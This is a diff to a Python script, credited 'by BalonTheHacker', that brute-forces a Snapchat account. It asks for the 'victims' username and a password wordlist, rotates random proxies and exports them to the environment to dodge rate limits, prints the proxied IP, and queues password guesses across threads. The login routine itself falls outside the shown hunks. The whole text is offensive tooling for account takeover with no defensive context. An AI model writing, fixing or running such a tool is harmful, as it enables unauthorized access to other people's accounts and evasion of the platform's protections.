@@ -2,6 +2,7 @@ import sys
 import os
 import requests
 import random
+import time
 from itertools import cycle
 import threading
 from queue import Queue
@@ -32,7 +33,7 @@ by BalonTheHacker
 snap_name = input("What is the victims snapchat username? ")
 password_list = input("What is the path to the password list? ")
 try:
-    password_list = open(password_list, "r+").readlines()
+    password_list = open(password_list).readlines()
 except:
     print("path invalid")
     quit()
@@ -67,10 +68,17 @@ proxies = {
     'https': working_proxies[number_of_proxy_rand],
 }
 
+os.environ['http_proxy'] = working_proxies[number_of_proxy_rand]
+os.environ['HTTP_PROXY'] = working_proxies[number_of_proxy_rand]
+os.environ['https_proxy'] = working_proxies[number_of_proxy_rand]
+os.environ['HTTPS_PROXY'] = working_proxies[number_of_proxy_rand]
+
 # Create the session and set the proxies.
-s = Snapchat()
 l = requests.Session()
 l.proxies = proxies
+
+s = Snapchat()
+
 
 r = l.get("https://httpbin.org/ip")
 print("your connecting through: ", r.text)
@@ -109,6 +117,8 @@ start = time.time()
 for worker in range(len(password_list)) :
     q.put(worker)
 q.join()
+
+
 
 print("Nothing found!")
 quit()
